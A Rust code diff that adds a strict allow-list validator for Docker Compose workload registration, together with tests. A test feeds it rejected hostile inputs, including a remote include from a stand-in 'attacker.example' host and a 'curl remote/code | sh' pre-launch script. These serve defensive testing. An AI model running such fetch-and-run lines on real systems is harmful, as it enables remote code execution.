@@ -99,6 +99,8 @@ pub enum RegistrationError {
     ImageWithoutDigest(String),
     #[error("a build: key is present; every service must resolve to a pinned image")]
     BuildNotAllowed,
+    #[error("closed workload policy: {0}")]
+    OpenWorkload(String),
 }
 
 impl RegistrationError {
@@ -124,10 +126,171 @@ pub fn check_registration(compose: &str, app_id: AppId) -> Result<ComposeHash, R
         .get("docker_compose_file")
         .and_then(Value::as_str)
         .ok_or(RegistrationError::NoDockerComposeFile)?;
-    YamlLoader::load_from_str(yaml)?
-        .iter()
-        .try_for_each(check_images)?;
+    let documents = YamlLoader::load_from_str(yaml)?;
+    documents.iter().try_for_each(check_images)?;
+    check_closed_workload(object, &documents)?;
     Ok(compose_hash(compose))
+}
+
+fn closed_error(message: &str) -> RegistrationError {
+    RegistrationError::OpenWorkload(message.into())
+}
+
+/// Initial CPU profile: executable bytes come only from digest-pinned images.
+/// New Compose capabilities must be explicitly qualified before adding them.
+fn check_closed_workload(
+    envelope: &serde_json::Map<String, Value>,
+    documents: &[Yaml],
+) -> Result<(), RegistrationError> {
+    if envelope.keys().any(|key| {
+        !matches!(
+            key.as_str(),
+            "allowed_envs"
+                | "docker_compose_file"
+                | "features"
+                | "gateway_enabled"
+                | "kms_enabled"
+                | "local_key_provider_enabled"
+                | "manifest_version"
+                | "name"
+                | "no_instance_id"
+                | "pre_launch_script"
+                | "public_logs"
+                | "public_sysinfo"
+                | "public_tcbinfo"
+                | "runner"
+                | "secure_time"
+                | "storage_fs"
+                | "tproxy_enabled"
+        )
+    }) {
+        return Err(closed_error(
+            "unknown envelope fields require qualification",
+        ));
+    }
+    if envelope.get("runner").and_then(Value::as_str) != Some("docker-compose") {
+        return Err(closed_error("docker-compose runner required"));
+    }
+    if envelope
+        .get("pre_launch_script")
+        .and_then(Value::as_str)
+        .is_some_and(|s| s != ":\n")
+    {
+        return Err(closed_error("custom pre-launch scripts are disabled"));
+    }
+    let [Yaml::Hash(root)] = documents else {
+        return Err(closed_error("exactly one Compose mapping required"));
+    };
+    if root
+        .keys()
+        .any(|k| !matches!(k.as_str(), Some("services" | "volumes")))
+    {
+        return Err(closed_error(
+            "external resolution and unknown top-level fields are disabled",
+        ));
+    }
+    let services = root
+        .get(&Yaml::String("services".into()))
+        .and_then(Yaml::as_hash)
+        .filter(|s| !s.is_empty())
+        .ok_or_else(|| closed_error("nonempty services required"))?;
+    if let Some(volumes) = root.get(&Yaml::String("volumes".into())) {
+        let volumes = volumes
+            .as_hash()
+            .ok_or_else(|| closed_error("volumes must be a mapping"))?;
+        for (name, value) in volumes {
+            if name.as_str() != Some("alpha-run") || !value.as_hash().is_some_and(|m| m.is_empty())
+            {
+                return Err(closed_error(
+                    "only the private alpha-run runtime socket volume is allowed",
+                ));
+            }
+        }
+    }
+    for (name, service) in services {
+        let service = service
+            .as_hash()
+            .ok_or_else(|| closed_error("service mapping required"))?;
+        let image = service
+            .get(&Yaml::String("image".into()))
+            .and_then(Yaml::as_str)
+            .ok_or_else(|| closed_error("every service requires a literal pinned image"))?;
+        if !has_sha256_digest(image) || image.contains('$') {
+            return Err(closed_error("literal pinned image required"));
+        }
+        for (field, value) in service {
+            match field.as_str() {
+                Some("image" | "ports" | "restart") => reject_interpolation(value)?,
+                Some("environment") => {
+                    let env = value
+                        .as_hash()
+                        .ok_or_else(|| closed_error("literal environment mapping required"))?;
+                    for (key, value) in env {
+                        let key = key
+                            .as_str()
+                            .ok_or_else(|| closed_error("environment name required"))?;
+                        let operational = name.as_str() == Some("alpha-kms")
+                            && matches!(
+                                key,
+                                "ALPHACOMPUTE_DATABASE_URL"
+                                    | "ALPHACOMPUTE_KMS_ENDPOINTS"
+                                    | "ALPHACOMPUTE_PCCS_URL"
+                                    | "ALPHACOMPUTE_PLATFORM_DOCUMENT_URL"
+                                    | "ALPHACOMPUTE_DATABASE_INTEGRITY"
+                                    | "ALPHACOMPUTE_KMS_DEV_ROOT_KEK"
+                            )
+                            || name.as_str() == Some("alpha-runtime")
+                                && key == "ALPHACOMPUTE_KMS_ENDPOINTS";
+                        if !operational || value.as_str() != Some(format!("${{{key}}}").as_str()) {
+                            reject_interpolation(value)?;
+                        }
+                    }
+                }
+                Some("volumes") => {
+                    let mounts = value
+                        .as_vec()
+                        .ok_or_else(|| closed_error("literal mount list required"))?;
+                    for mount in mounts {
+                        let runtime = matches!(name.as_str(), Some("alpha-runtime" | "alpha-kms"));
+                        let allowed = mount.as_str() == Some("alpha-run:/run/alpha")
+                            || runtime
+                                && matches!(
+                                    mount.as_str(),
+                                    Some(
+                                        "/var/run/dstack.sock:/var/run/dstack.sock"
+                                            | "/run/log/dstack:/run/log/dstack:ro"
+                                            | "/sys/firmware/acpi/tables/data/CCEL:/ccel:ro"
+                                    )
+                                );
+                        if !allowed {
+                            return Err(closed_error(
+                                "mutable executable mounts and host sockets are disabled",
+                            ));
+                        }
+                    }
+                }
+                _ => {
+                    return Err(closed_error(
+                        "unknown service fields, build, include, extends, commands and entrypoint overrides are disabled",
+                    ));
+                }
+            }
+        }
+    }
+    Ok(())
+}
+
+fn reject_interpolation(value: &Yaml) -> Result<(), RegistrationError> {
+    match value {
+        Yaml::String(s) if s.contains('$') => Err(closed_error(
+            "environment interpolation is disabled for workload inputs",
+        )),
+        Yaml::Array(items) => items.iter().try_for_each(reject_interpolation),
+        Yaml::Hash(_) | Yaml::Alias(_) => Err(closed_error(
+            "structured or aliased executable inputs are disabled",
+        )),
+        _ => Ok(()),
+    }
 }
 
 fn check_images(node: &Yaml) -> Result<(), RegistrationError> {
@@ -152,7 +315,9 @@ fn check_images(node: &Yaml) -> Result<(), RegistrationError> {
 fn has_sha256_digest(image: &str) -> bool {
     image
         .rsplit_once("@sha256:")
-        .is_some_and(|(_, hex)| hex_bytes::<32>(hex).is_some())
+        .is_some_and(|(repository, hex)| {
+            !repository.is_empty() && !repository.contains('$') && hex_bytes::<32>(hex).is_some()
+        })
 }
 
 #[cfg(test)]
@@ -175,12 +340,50 @@ mod tests {
     }
 
     #[test]
+    fn approval_closes_external_and_mutable_workload_dependencies() {
+        let approved = read("05-deploy", "app-compose.json");
+        let base: Value = serde_json::from_str(&approved).unwrap();
+        let app_id: AppId = base["name"].as_str().unwrap().parse().unwrap();
+        assert!(check_registration(&approved, app_id).is_ok());
+        let image = format!("repo@sha256:{}", "a".repeat(64));
+        for yaml in [
+            "include: https://attacker.example/compose.yaml".to_owned(),
+            format!(
+                "services:\n  app:\n    image: {image}\n    extends: {{file: remote.yaml, service: app}}\n"
+            ),
+            format!("services:\n  app:\n    image: {image}\n    env_file: /host/env\n"),
+            format!("services:\n  app:\n    image: {image}\n    volumes: [/host:/code]\n"),
+            format!("services:\n  app:\n    image: {image}\n    command: curl remote/code\n"),
+            format!(
+                "services:\n  app:\n    image: {image}\n    environment: {{CODE: '${{REMOTE}}'}}\n"
+            ),
+            format!("services:\n  app:\n    image: {image}\n---\nservices: {{}}\n"),
+        ] {
+            let mut bad = base.clone();
+            bad["docker_compose_file"] = Value::String(yaml);
+            assert!(check_registration(&serde_json::to_string(&bad).unwrap(), app_id).is_err());
+        }
+        for (key, value) in [
+            ("pre_launch_script", json!("curl remote/code | sh")),
+            ("unknown_loader", json!("remote/code")),
+        ] {
+            let mut bad = base.clone();
+            bad[key] = value;
+            assert!(check_registration(&serde_json::to_string(&bad).unwrap(), app_id).is_err());
+        }
+    }
+
+    #[test]
     fn registration_vector() {
         let expected: Value = serde_json::from_str(&read("01-canonical", "expected.json")).unwrap();
         let app_id: AppId = expected["app_id"].as_str().unwrap().parse().unwrap();
         let compose = read("01-canonical", "app-compose.json");
 
-        let hash = check_registration(&compose, app_id).unwrap();
+        assert!(
+            check_registration(&compose, app_id).is_err(),
+            "historical open profile is no longer admitted"
+        );
+        let hash = compose_hash(&compose);
         assert_eq!(hash.to_string(), expected["compose_hash"]);
         assert_eq!(hash, compose_hash(&compose));
 
@@ -210,9 +413,9 @@ mod tests {
         let app_id: AppId = "01994b3e-5c8a-7d3e-9a1b-2c3d4e5f6a7b".parse().unwrap();
         let canonical = read("01-canonical", "app-compose.json");
         let with_newline = read("04-trailing-newline", "input.json");
-        let hash = check_registration(&with_newline, app_id).unwrap();
+        let hash = compose_hash(&with_newline);
         assert_ne!(hash, compose_hash(&canonical));
-        assert!(check_registration(&read("01-canonical", "input.json"), app_id).is_ok());
+        assert!(check_registration(&read("01-canonical", "input.json"), app_id).is_err());
     }
 
     #[test]
